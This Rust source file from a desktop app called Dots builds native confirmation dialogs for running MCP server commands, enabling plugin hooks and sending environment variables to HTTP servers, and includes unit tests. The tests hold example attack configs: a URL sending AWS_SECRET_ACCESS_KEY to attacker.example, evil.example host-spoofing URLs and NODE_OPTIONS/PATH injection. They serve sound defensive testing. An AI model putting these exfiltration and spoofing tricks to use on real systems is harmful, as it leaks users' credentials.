//! Native confirmations for changes the webview must not make on its own (spec §12).

use std::future::Future;

use dots_core::library::{
    check_name, http_origin, origin_changed, LibraryConfig, LibraryItem, LibraryKind,
    McpServerConfig,
};
use dots_core::library_service::McpProbe;
use dots_core::model::SettingsSaved;
use dots_core::settings::Settings;
use dots_core::Runtime;
use tauri::{AppHandle, Manager};
use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};

use crate::error::CmdError;

/// Debug builds accept `DOTS_CONFIRM=yes` in place of the dialog, so a smoke run can change
/// the Claude program without a person at the screen. Release builds always ask.
pub const CONFIRM_ENV: &str = "DOTS_CONFIRM";

/// The program a settings change would make Dots run as the Claude CLI, when that needs the
/// user's confirmation: a non-empty `claude_path` that differs from the stored one. Clearing
/// the path (back to searching `PATH`) and saving it unchanged need none. The caller passes the
/// path already normalized, and the comparison is exact: the string returned is the string that
/// is saved, so any difference, even in whitespace, needs the user's yes.
pub fn claude_program_to_confirm(current: Option<&str>, next: Option<&str>) -> Option<String> {
    let next = next.filter(|p| !p.trim().is_empty())?;
    (current != Some(next)).then(|| next.to_string())
}

pub fn claude_program_message(program: &str) -> String {
    format!(
        "Dots will run this program as the Claude CLI from the next start:\n\n{program}\n\n\
         Allow this only for a program you trust."
    )
}

/// Saves `settings`, after the user's yes when they name a new Claude program. `ask` is given
/// the question and answers whether the user allowed it; the app passes the native dialog.
///
/// The order is the point of this function. The path is trimmed once, so the string compared,
/// shown and saved is the same one. Invalid settings are refused before anything is asked, so
/// the user never allows a save that then fails. Nothing is saved before the answer, and a "no"
/// answers `cancelled` with nothing changed.
pub async fn save_settings_confirmed<F, Fut>(
    rt: &Runtime,
    mut settings: Settings,
    ask: F,
) -> Result<SettingsSaved, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    settings.claude_path = settings.claude_path.map(|p| p.trim().to_string());
    settings.validate()?;
    let stored = rt.settings().await;
    if let Some(program) = claude_program_to_confirm(
        stored.claude_path.as_deref(),
        settings.claude_path.as_deref(),
    ) {
        if !ask(claude_program_message(&program)).await {
            return Err(CmdError::cancelled("the Claude program was not changed"));
        }
    }
    Ok(rt.update_settings(settings).await?)
}

/// The question to ask before Dots runs or stores what a Library `config` names, or `None`
/// when none is needed. `stored` is the item's config now (`None` for a new item or a probe).
/// Every part of a command line, folder, key, origin and plugin command line shows in double
/// quotes with `"` and `\` escaped (a control or direction character, which the core refuses in a
/// config, as `\u{..}`), so where one part ends is visible.
/// - A stdio MCP server whose `command`, `args`, `cwd` or `env` differ from the stored ones (a
///   new server differs): Dots would start that program. `env` is compared as stored, the
///   `${VAR}` text, and the question names its keys, never values.
/// - An http MCP server whose `url` or header values name `${VAR}`: Dots would send the values of
///   those variables to the URL's origin. It asks when the origin or the set of variable names is
///   new or changed (a stored stdio server or other kind counts as new). Names, never values.
/// - A plugin that starts stdio servers or has http servers that send variables (a plugin author
///   writes its `.mcp.json`): `plugin_starts` holds their (quoted) command lines and
///   `the values of A to "origin"` entries, which
///   the caller read from the plugin's `.mcp.json` when the plugin is new or its path changed
///   (and left empty otherwise). It is combined with
/// - a plugin whose hooks are newly on: `run_hooks` went from off to on, or is on at a new path
///   (a new plugin counts as off). Its hooks run commands without approval.
///
/// Anything else, a header literal change included, needs none. This function reads no disk.
pub fn library_confirmation(
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    plugin_starts: &[String],
) -> Option<String> {
    library_confirmation_in(stored, next, plugin_starts, &process_env)
}

/// Dots' own environment, where the server's `${VAR}` is read when it starts.
fn process_env(key: &str) -> Option<String> {
    std::env::var(key).ok()
}

/// `library_confirmation` with the environment the origin is computed from. The origin shown is
/// the one the HTTP client reaches after `${VAR}` in the URL is expanded, not the text read
/// first: a variable holding a `/` or `\` moves the host.
pub fn library_confirmation_in(
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    plugin_starts: &[String],
    env: &dyn Fn(&str) -> Option<String>,
) -> Option<String> {
    match next {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command,
            args,
            cwd,
            env,
        }) => {
            if let Some(LibraryConfig::McpServer(McpServerConfig::Stdio {
                command: c,
                args: a,
                cwd: w,
                env: e,
            })) = stored
            {
                if (c, a, w, e) == (command, args, cwd, env) {
                    return None;
                }
            }
            let place = cwd
                .as_deref()
                .map(|d| format!(" in {}", quoted(d)))
                .unwrap_or_default();
            let keys = if env.is_empty() {
                String::new()
            } else {
                let keys: Vec<String> = env.keys().map(|k| quoted(k)).collect();
                format!(" with env {}", keys.join(", "))
            };
            Some(format!(
                "Dots will run: {}{place}{keys}. Run it?\n\nAllow this only for a program you trust.",
                command_line(command, args)
            ))
        }
        LibraryConfig::McpServer(server @ McpServerConfig::Http { url, .. }) => {
            let variables = server.variables();
            if variables.is_empty() {
                return None;
            }
            if let Some(LibraryConfig::McpServer(old @ McpServerConfig::Http { url: u, .. })) =
                stored
            {
                if !origin_changed(u, url, env) && old.variables() == variables {
                    return None;
                }
            }
            Some(format!(
                "Dots will send the values of {} to {}. Send them?\n\nAllow this only for a \
                 server you trust.",
                variables.join(", "),
                origin_text(url, env)
            ))
        }
        LibraryConfig::Plugin(p) => {
            let was_on = matches!(
                stored,
                Some(LibraryConfig::Plugin(old)) if old.run_hooks && old.path == p.path
            );
            let hooks = p.run_hooks && !was_on;
            // An entry `the values of A to "origin"` is an http server that sends variables;
            // any other is a stdio command line.
            let (sends, starts): (Vec<&String>, Vec<&String>) = plugin_starts
                .iter()
                .partition(|e| e.starts_with(SENDS_PREFIX));
            if starts.is_empty() && sends.is_empty() {
                return hooks.then(|| {
                    "This plugin's hooks run commands on their own, without approval, and can approve tool calls. Run them?"
                        .to_string()
                });
            }
            let join = |v: &[&String]| v.iter().map(|e| e.as_str()).collect::<Vec<_>>().join("; ");
            let mut text = match (starts.is_empty(), sends.is_empty()) {
                (false, true) => format!("This plugin starts: {}.", join(&starts)),
                (true, _) => format!("This plugin sends {}.", join(&sends)),
                (false, false) => format!(
                    "This plugin starts: {}. It sends {}.",
                    join(&starts),
                    join(&sends)
                ),
            };
            if hooks {
                text.push_str(
                    " Its hooks also run commands on their own, without approval, and can approve tool calls.",
                );
            }
            text.push_str(" Add it?");
            Some(text)
        }
        _ => None,
    }
}

/// Where `url` sends its requests, for a dialog: the quoted ASCII origin, with the Unicode host
/// in parentheses when it differs. When there is no origin (a variable that is not set, text
/// that is no URL), the quoted URL and why the server cannot start.
fn origin_text(url: &str, env: &dyn Fn(&str) -> Option<String>) -> String {
    match http_origin(url, env) {
        Ok(o) => match o.unicode {
            Some(u) => format!("{} ({u})", quoted(&o.ascii)),
            None => quoted(&o.ascii),
        },
        Err(why) if why.ends_with("is not set") => format!(
            "{} ({why}: the server cannot start until it is set)",
            quoted(url)
        ),
        Err(why) => format!("{} ({why}: the server cannot start)", quoted(url)),
    }
}

/// The title of the dialog for a question `library_confirmation` made.
pub fn library_title(question: &str) -> &'static str {
    if question.starts_with("Dots will send") {
        "Send these variables?"
    } else if question.starts_with("This plugin") {
        "Add this plugin?"
    } else {
        "Run this program?"
    }
}

/// `text` in double quotes, `"` and `\` escaped, a control or direction character as `\u{..}`.
fn quoted(text: &str) -> String {
    let mut out = String::from("\"");
    for c in text.chars() {
        match c {
            '"' | '\\' => {
                out.push('\\');
                out.push(c);
            }
            c if c.is_control()
                || matches!(c, '\u{061C}' | '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}') =>
            {
                out.push_str(&format!("\\u{{{:04X}}}", c as u32));
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

fn command_line(command: &str, args: &[String]) -> String {
    std::iter::once(command)
        .chain(args.iter().map(String::as_str))
        .map(quoted)
        .collect::<Vec<_>>()
        .join(" ")
}

/// The command lines of the stdio servers, and the variables and origin of the http servers that
/// name `${VAR}`, in the plugin folder `config` names, for the question
/// of `library_confirmation`. Only when the plugin is new (`stored` is `None`) or its path
/// changed; a folder that cannot be read gives none, and the core then refuses it.
fn plugin_starts(stored: Option<&LibraryConfig>, config: &LibraryConfig) -> Vec<String> {
    let LibraryConfig::Plugin(next) = config else {
        return Vec::new();
    };
    if matches!(stored, Some(LibraryConfig::Plugin(old)) if old.path == next.path) {
        return Vec::new();
    }
    let Ok(info) = dots_core::kit::read_plugin(std::path::Path::new(&next.path)) else {
        return Vec::new();
    };
    info.servers
        .iter()
        .filter_map(|s| match &s.config {
            McpServerConfig::Stdio { command, args, .. } => Some(command_line(command, args)),
            http @ McpServerConfig::Http { url, .. } => {
                let variables = http.variables();
                (!variables.is_empty()).then(|| {
                    format!(
                        "{SENDS_PREFIX}{} to {}",
                        variables.join(", "),
                        origin_text(url, &process_env)
                    )
                })
            }
        })
        .collect()
}

/// Starts an entry of `plugin_starts` for an http server that sends variables.
const SENDS_PREFIX: &str = "the values of ";

/// Asks `library_confirmation`'s question, if there is one. A refusal is `cancelled`, and the
/// caller then starts and stores nothing.
async fn confirm_library<F, Fut>(
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    ask: F,
) -> Result<(), CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    if let Some(question) = library_confirmation(stored, next, &plugin_starts(stored, next)) {
        if !ask(question).await {
            return Err(CmdError::cancelled("declined: nothing was run or saved"));
        }
    }
    Ok(())
}

/// `library_probe`, after the user's yes when the config is a stdio server.
pub async fn probe_confirmed<F, Fut>(
    rt: &Runtime,
    config: McpServerConfig,
    ask: F,
) -> Result<McpProbe, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let next = LibraryConfig::McpServer(config);
    // Refused before it is asked: the person never allows what the core would refuse.
    next.validate()?;
    confirm_library(None, &next, ask).await?;
    let LibraryConfig::McpServer(config) = next else {
        unreachable!("wrapped above")
    };
    Ok(rt.library().probe(&config).await?)
}

/// `library_add`, after the user's yes when it adds a stdio server or a plugin with hooks on.
pub async fn add_confirmed<F, Fut>(
    rt: &Runtime,
    name: &str,
    config: LibraryConfig,
    accept: Option<&str>,
    ask: F,
) -> Result<LibraryItem, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    config.validate()?;
    check_name(config.kind(), name)?;
    if accept.is_some() && config.kind() != LibraryKind::McpServer {
        return Err(dots_core::Error::Invalid(
            "only an MCP server has a tool list to accept".into(),
        )
        .into());
    }
    confirm_library(None, &config, ask).await?;
    Ok(rt.library().add(name, config, accept).await?)
}

/// `library_update`, after the user's yes when the stored config does not already hold what is
/// asked for: another stdio command line, or hooks switched on.
pub async fn update_confirmed<F, Fut>(
    rt: &Runtime,
    id: &str,
    config: LibraryConfig,
    ask: F,
) -> Result<LibraryItem, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let stored = rt
        .library()
        .list()
        .await?
        .into_iter()
        .find(|e| e.item.id == id)
        .map(|e| e.item);
    // An id the Library does not have is the core's `not_found`, before any question. So is
    // what the core refuses: a bad config, another kind, a plugin's own server.
    if let Some(stored) = &stored {
        config.validate()?;
        if stored.config.kind() != config.kind() {
            return Err(dots_core::Error::Invalid(format!(
                "the {} {:?} cannot become a {}",
                stored.config.kind().label(),
                stored.name,
                config.kind().label()
            ))
            .into());
        }
        if stored.owner_id.is_some() {
            return Err(dots_core::Error::Invalid(format!(
                "the MCP server {:?} comes with a plugin; change the plugin instead",
                stored.name
            ))
            .into());
        }
        confirm_library(Some(&stored.config), &config, ask).await?;
    }
    Ok(rt.library().update(id, config).await?)
}

/// Whether the environment answers confirmations instead of the user.
pub fn preconfirmed(debug_build: bool, env: Option<&str>) -> bool {
    debug_build && env == Some("yes")
}

/// Asks in a native dialog, which the webview cannot answer. `false` when declined or closed.
pub async fn ask(app: &AppHandle, title: &str, message: String) -> bool {
    let env = std::env::var(CONFIRM_ENV).ok();
    if preconfirmed(cfg!(debug_assertions), env.as_deref()) {
        tracing::warn!("{CONFIRM_ENV}=yes: confirmed without a dialog: {title}");
        return true;
    }
    let (tx, rx) = tokio::sync::oneshot::channel();
    let mut dialog = app
        .dialog()
        .message(message)
        .title(title)
        .kind(MessageDialogKind::Warning)
        .buttons(MessageDialogButtons::OkCancelCustom(
            "Allow".into(),
            "Cancel".into(),
        ));
    if let Some(window) = app.get_webview_window("main") {
        dialog = dialog.parent(&window);
    }
    dialog.show(move |allowed| {
        let _ = tx.send(allowed);
    });
    rx.await.unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::CmdErrorKind;

    #[test]
    fn only_a_new_program_needs_confirmation() {
        let ask = claude_program_to_confirm;
        assert_eq!(
            ask(None, Some("C:/x/claude.exe")),
            Some("C:/x/claude.exe".into())
        );
        // Exact: the string shown is the string saved, so it is returned as given.
        assert_eq!(
            ask(Some("C:/a.exe"), Some("C:/b.exe")),
            Some("C:/b.exe".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe"), Some("C:/a.exe\u{a0}")),
            Some("C:/a.exe\u{a0}".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe"), Some(" C:/a.exe")),
            Some(" C:/a.exe".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe "), Some("C:/a.exe")),
            Some("C:/a.exe".into())
        );
        // Unchanged, cleared, or empty (which validation rejects anyway): no dialog.
        assert_eq!(ask(Some("C:/a.exe"), Some("C:/a.exe")), None);
        assert_eq!(ask(Some("C:/a.exe"), None), None);
        assert_eq!(ask(None, None), None);
        assert_eq!(ask(None, Some("  ")), None);
    }

    fn stdio(command: &str, args: &[&str], cwd: Option<&str>) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: command.into(),
            args: args.iter().map(|a| a.to_string()).collect(),
            cwd: cwd.map(String::from),
            env: Default::default(),
        })
    }

    fn plugin(run_hooks: bool) -> LibraryConfig {
        LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: "C:/p".into(),
            installed_id: None,
            run_hooks,
        })
    }

    fn http() -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Http {
            url: "http://127.0.0.1:1/mcp".into(),
            headers: Default::default(),
        })
    }

    #[test]
    fn a_stdio_command_line_needs_a_yes_unless_it_is_the_stored_one() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let next = stdio("npx", &["-y", "srv"], Some("C:/d"));
        let asked = q(None, &next).unwrap();
        assert!(asked.starts_with(r#"Dots will run: "npx" "-y" "srv" in "C:/d". Run it?"#));
        // Without a folder the question names none.
        assert!(q(None, &stdio("srv", &[], None))
            .unwrap()
            .starts_with(r#"Dots will run: "srv". Run it?"#));
        // The same command line, args, folder and env: no question.
        assert_eq!(q(Some(&next), &next), None);
        // Any difference in the command, an argument or the folder asks.
        for other in [
            stdio("node", &["-y", "srv"], Some("C:/d")),
            stdio("npx", &["-y", "evil"], Some("C:/d")),
            stdio("npx", &["-y", "srv"], Some("C:/e")),
            stdio("npx", &["-y", "srv"], None),
        ] {
            assert!(q(Some(&next), &other).is_some(), "{other:?}");
        }
        // Stored as another kind or transport: new for this purpose.
        assert!(q(Some(&http()), &next).is_some());
        assert!(q(Some(&plugin(false)), &next).is_some());
    }

    fn stdio_env(env: &[(&str, &str)]) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: "npx".into(),
            args: vec!["srv".into()],
            cwd: None,
            env: env
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
        })
    }

    #[test]
    fn a_change_of_env_asks_and_names_the_keys_but_not_the_values() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let stored = stdio_env(&[("A", "${A}")]);
        assert_eq!(q(Some(&stored), &stdio_env(&[("A", "${A}")])), None);
        // A value (the stored text), a key added, a key removed.
        for next in [
            stdio_env(&[("A", "${B}")]),
            stdio_env(&[("A", "${A}"), ("NODE_OPTIONS", "--require x")]),
            stdio_env(&[]),
        ] {
            assert!(q(Some(&stored), &next).is_some(), "{next:?}");
        }
        let asked = q(
            Some(&stored),
            &stdio_env(&[("PATH", "C:/evil"), ("NODE_OPTIONS", "--require x")]),
        )
        .unwrap();
        assert!(
            asked.starts_with(
                r#"Dots will run: "npx" "srv" with env "NODE_OPTIONS", "PATH". Run it?"#
            ),
            "{asked}"
        );
        assert!(!asked.contains("evil") && !asked.contains("--require"));
        // With a folder the keys follow it.
        let LibraryConfig::McpServer(McpServerConfig::Stdio {
            command, args, env, ..
        }) = stdio_env(&[("A", "${A}")])
        else {
            unreachable!()
        };
        let in_dir = LibraryConfig::McpServer(McpServerConfig::Stdio {
            command,
            args,
            cwd: Some("C:/d".into()),
            env,
        });
        assert!(q(None, &in_dir)
            .unwrap()
            .starts_with(r#"Dots will run: "npx" "srv" in "C:/d" with env "A". Run it?"#));
    }

    #[test]
    fn a_plugin_that_starts_servers_asks_with_their_command_lines_and_the_hooks_in_one_dialog() {
        let starts = vec!["node a.js --x".to_string(), "uvx b".to_string()];
        let q = library_confirmation;
        // Servers only.
        assert_eq!(
            q(None, &plugin(false), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Add it?"
        );
        // Servers and hooks: one question.
        assert_eq!(
            q(None, &plugin(true), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Its hooks also run commands on their own, \
             without approval, and can approve tool calls. Add it?"
        );
        // A plugin with hooks already on, and servers to start, asks about the servers only.
        assert_eq!(
            q(Some(&plugin(true)), &plugin(true), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Add it?"
        );
        // Nothing to start and nothing switched on: no question.
        assert_eq!(q(None, &plugin(false), &[]), None);
        assert_eq!(q(Some(&plugin(true)), &plugin(true), &[]), None);
    }

    #[test]
    fn the_plugin_servers_are_read_for_a_new_plugin_or_a_new_path_only() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"a":{"command":"node","args":["a.js"]},"b":{"type":"http","url":"http://127.0.0.1:1/mcp"}}}"#,
        )
        .unwrap();
        let at = |path: &std::path::Path| {
            LibraryConfig::Plugin(dots_core::library::PluginConfig {
                path: path.to_string_lossy().into_owned(),
                installed_id: None,
                run_hooks: false,
            })
        };
        let config = at(dir.path());
        // New: the stdio server's command line; the HTTP one starts nothing.
        assert_eq!(plugin_starts(None, &config), [r#""node" "a.js""#]);
        // Same path: not read, not asked again.
        assert!(plugin_starts(Some(&config), &config).is_empty());
        // Another path: read again.
        let elsewhere = at(std::path::Path::new("C:/no/such/plugin"));
        assert_eq!(
            plugin_starts(Some(&elsewhere), &config),
            [r#""node" "a.js""#]
        );
        // Unreadable: nothing here; the core refuses the folder.
        assert!(plugin_starts(None, &elsewhere).is_empty());
        // Not a plugin.
        assert!(plugin_starts(None, &stdio("x", &[], None)).is_empty());
    }

    #[test]
    fn a_http_server_and_a_skill_need_no_question() {
        let skill = LibraryConfig::Skill(dots_core::library::SkillConfig {
            path: "C:/s".into(),
        });
        assert_eq!(library_confirmation(None, &http(), &[]), None);
        assert_eq!(library_confirmation(None, &skill, &[]), None);
    }

    #[test]
    fn hooks_ask_only_when_they_go_from_off_to_on() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let asked = q(Some(&plugin(false)), &plugin(true)).unwrap();
        assert_eq!(
            asked,
            "This plugin's hooks run commands on their own, without approval, and can approve \
             tool calls. Run them?"
        );
        // A new plugin with hooks on switches them on from nothing.
        assert!(q(None, &plugin(true)).is_some());
        assert_eq!(q(Some(&plugin(true)), &plugin(true)), None);
        assert_eq!(q(Some(&plugin(true)), &plugin(false)), None);
        assert_eq!(q(Some(&plugin(false)), &plugin(false)), None);
        assert_eq!(q(None, &plugin(false)), None);
    }

    #[test]
    fn a_moved_plugin_with_hooks_on_asks_about_the_hooks_again() {
        let at = |path: &str, run_hooks: bool| {
            LibraryConfig::Plugin(dots_core::library::PluginConfig {
                path: path.into(),
                installed_id: None,
                run_hooks,
            })
        };
        let (a, b) = (at("C:/a", true), at("C:/b", true));
        // The same path, hooks already on: nothing. Another path: the hooks are new there.
        assert_eq!(library_confirmation(Some(&a), &a, &[]), None);
        let asked = library_confirmation(Some(&a), &b, &[]).unwrap();
        assert!(asked.contains("hooks run commands"), "{asked}");
        let starts = vec![r#""node" "x.js""#.to_string()];
        let asked = library_confirmation(Some(&a), &b, &starts).unwrap();
        assert!(asked.contains("Its hooks also run commands"), "{asked}");
        // Moved with hooks off: no hooks sentence.
        assert_eq!(
            library_confirmation(Some(&a), &at("C:/b", false), &[]),
            None
        );
    }

    #[test]
    fn every_part_shows_quoted_so_the_boundaries_are_visible() {
        let q = |n: &LibraryConfig| library_confirmation(None, n, &[]).unwrap();
        // One argument with a space is not two.
        let one = q(&stdio("node", &["a b"], None));
        let two = q(&stdio("node", &["a", "b"], None));
        assert!(
            one.starts_with(r#"Dots will run: "node" "a b". Run it?"#),
            "{one}"
        );
        assert_ne!(one, two);
        // A quote and a backslash are escaped; a control or direction character is spelled out.
        let odd = q(&stdio("node", &["x\" \\ \n\u{202e}"], None));
        assert!(
            odd.starts_with(r#"Dots will run: "node" "x\" \\ \u{000A}\u{202E}". Run it?"#),
            "{odd}"
        );
    }

    #[tokio::test]
    async fn what_the_core_refuses_is_refused_before_any_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let asked = std::cell::Cell::new(0);
        let ask = |_| {
            asked.set(asked.get() + 1);
            std::future::ready(true)
        };
        let LibraryConfig::McpServer(bad_arg) = stdio("node", &["a\nb"], None) else {
            unreachable!()
        };
        let err = probe_confirmed(&rt, bad_arg, ask).await.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        let in_key = LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: "node".into(),
            args: vec![],
            cwd: None,
            env: [("A\nB".to_string(), "v".to_string())].into(),
        });
        let err = add_confirmed(&rt, "srv", in_key, None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        let bidi = stdio("node", &["a\u{202e}b"], None);
        let err = add_confirmed(&rt, "srv", bidi, None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        // A bad name.
        let err = add_confirmed(&rt, "Bad Name", stdio("node", &[], None), None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        // A kind change on update.
        let item = add_confirmed(&rt, "srv", http(), None, ask).await.unwrap();
        let skill = LibraryConfig::Skill(dots_core::library::SkillConfig {
            path: "C:/s".into(),
        });
        let err = update_confirmed(&rt, &item.id, skill, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(asked.get(), 0);
        rt.shutdown();
    }

    fn http_with(url: &str, header: &str) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Http {
            url: url.into(),
            headers: [("X-Key".to_string(), header.to_string())].into(),
        })
    }

    #[test]
    fn an_http_server_that_sends_variables_asks_for_a_new_origin_or_variable() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let base = http_with("https://Host.example:8443/mcp", "Bearer ${GITHUB_TOKEN}");
        let asked = q(None, &base).unwrap();
        assert!(
            asked.starts_with(
                r#"Dots will send the values of GITHUB_TOKEN to "https://host.example:8443". Send them?"#
            ),
            "{asked}"
        );
        assert_eq!(library_title(&asked), "Send these variables?");
        // Only a literal, the origin and the variables the same: no question.
        let same = http_with("https://host.example:8443/other", "Bearer ${GITHUB_TOKEN}");
        assert_eq!(q(Some(&base), &same), None);
        // Another origin, another or one more variable, or a stored stdio server: asks.
        for next in [
            http_with("https://evil.example/mcp", "Bearer ${GITHUB_TOKEN}"),
            http_with("http://host.example:8443/mcp", "Bearer ${GITHUB_TOKEN}"),
            http_with("https://host.example:8443/mcp", "${OTHER}"),
            http_with("https://host.example:8443/${AWS_SECRET}", "${GITHUB_TOKEN}"),
        ] {
            assert!(q(Some(&base), &next).is_some(), "{next:?}");
        }
        assert!(q(Some(&stdio("x", &[], None)), &base).is_some());
        // Nothing to send, nothing to ask.
        assert_eq!(q(None, &http_with("https://h/mcp", "plain")), None);
        let two = q(None, &http_with("https://h/${B}", "${A}")).unwrap();
        assert!(two.contains("values of A, B to"), "{two}");
    }

    #[tokio::test]
    async fn a_refused_variable_send_is_cancelled_before_the_core() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let LibraryConfig::McpServer(leak) =
            http_with("https://attacker.example/${AWS_SECRET_ACCESS_KEY}", "x")
        else {
            unreachable!()
        };
        let mut asked = Vec::new();
        let err = probe_confirmed(&rt, leak, |q| {
            asked.push(q);
            std::future::ready(false)
        })
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(
            asked[0].contains("AWS_SECRET_ACCESS_KEY") && asked[0].contains("attacker.example")
        );
        let no = |_| std::future::ready(false);
        let yes = |_| std::future::ready(true);
        let config = http_with("https://a.example/mcp", "${TOK}");
        let err = add_confirmed(&rt, "web", config.clone(), None, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());
        let item = add_confirmed(&rt, "web", config, None, yes).await.unwrap();
        // A header literal only: no question (a refusal would stop it). Another origin asks.
        let same = http_with("https://a.example/mcp", "${TOK}");
        update_confirmed(&rt, &item.id, same, no).await.unwrap();
        let moved = http_with("https://b.example/mcp", "${TOK}");
        let err = update_confirmed(&rt, &item.id, moved, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        rt.shutdown();
    }

    #[test]
    fn a_new_plugin_whose_http_server_sends_variables_asks_and_names_them() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"w":{"type":"http","url":"https://H.example:9/x","headers":{"A":"Bearer ${TOKEN}"}},"plain":{"type":"http","url":"https://plain.example/mcp"}}}"#,
        )
        .unwrap();
        let config = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: dir.path().to_string_lossy().into_owned(),
            installed_id: None,
            run_hooks: false,
        });
        let starts = plugin_starts(None, &config);
        assert_eq!(starts, [r#"the values of TOKEN to "https://h.example:9""#]);
        let asked = library_confirmation(None, &config, &starts).unwrap();
        assert_eq!(
            asked,
            r#"This plugin sends the values of TOKEN to "https://h.example:9". Add it?"#
        );
        // With stdio servers and hooks the one dialog holds all three.
        let both = vec![r#""node" "a.js""#.to_string(), starts[0].clone()];
        let hooks = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            run_hooks: true,
            ..match &config {
                LibraryConfig::Plugin(p) => p.clone(),
                _ => unreachable!(),
            }
        });
        let asked = library_confirmation(None, &hooks, &both).unwrap();
        assert!(asked.starts_with(r#"This plugin starts: "node" "a.js". It sends the values of"#));
        assert!(asked.contains("Its hooks also run commands"), "{asked}");
        // Only a variable-free http server: nothing to ask.
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"plain":{"type":"http","url":"https://plain.example/mcp"}}}"#,
        )
        .unwrap();
        let none = plugin_starts(None, &config);
        assert!(none.is_empty());
        assert_eq!(library_confirmation(None, &config, &none), None);
    }

    #[test]
    fn the_dialog_names_the_origin_the_client_will_use() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let trusted = http_with("https://api.github.com/mcp", "${GITHUB_TOKEN}");
        let sneaky = http_with(
            r"https://evil.example\@api.github.com/mcp",
            "${GITHUB_TOKEN}",
        );
        let asked = q(Some(&trusted), &sneaky).unwrap();
        assert!(asked.contains(r#"to "https://evil.example""#), "{asked}");
        // The default port is no change.
        let with_port = http_with("https://API.github.com:443/other", "${GITHUB_TOKEN}");
        assert_eq!(q(Some(&trusted), &with_port), None);
        // A variable in the host: the raw url, quoted.
        let var = http_with("https://${HOST}/mcp", "x");
        let asked = q(None, &var).unwrap();
        assert!(
            asked.contains(r#"values of HOST to "https://${HOST}/mcp""#),
            "{asked}"
        );
    }

    #[test]
    fn the_dialog_names_the_host_a_variable_moves_the_url_to() {
        let env = |k: &str| match k {
            "HOMEPATH" => Some(r"\Users\aksha".to_string()),
            "GITHUB_TOKEN" => Some("t".to_string()),
            "IDN" => Some("bücher.de".to_string()),
            _ => None,
        };
        let q =
            |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation_in(s, n, &[], &env);
        // validate refuses these texts; the dialog is the second line of defence.
        let sneaky = http_with(
            "https:///evil.example${HOMEPATH}@api.github.com/mcp",
            "${GITHUB_TOKEN}",
        );
        let asked = q(None, &sneaky).unwrap();
        assert!(
            asked.contains(r#"values of GITHUB_TOKEN, HOMEPATH to "https://evil.example""#),
            "{asked}"
        );
        // An update from the trusted host to it asks, though the raw text reads like the same one.
        let trusted = http_with("https://api.github.com/mcp", "${GITHUB_TOKEN}");
        assert!(q(Some(&trusted), &sneaky).is_some());
        // An unset variable: the raw url, quoted, and why.
        let unset = http_with("https://${NOPE}/mcp", "x");
        let asked = q(None, &unset).unwrap();
        assert!(
            asked.contains(
                r#"to "https://${NOPE}/mcp" (NOPE is not set: the server cannot start until it is set)"#
            ),
            "{asked}"
        );
        // A host in Unicode shows both forms.
        let idn = http_with("https://${IDN}/mcp", "x");
        let asked = q(None, &idn).unwrap();
        assert!(
            asked.contains(r#"to "https://xn--bcher-kva.de" (bücher.de)"#),
            "{asked}"
        );
    }

    #[test]
    fn the_core_refuses_the_urls_the_dialog_could_misname() {
        for url in [
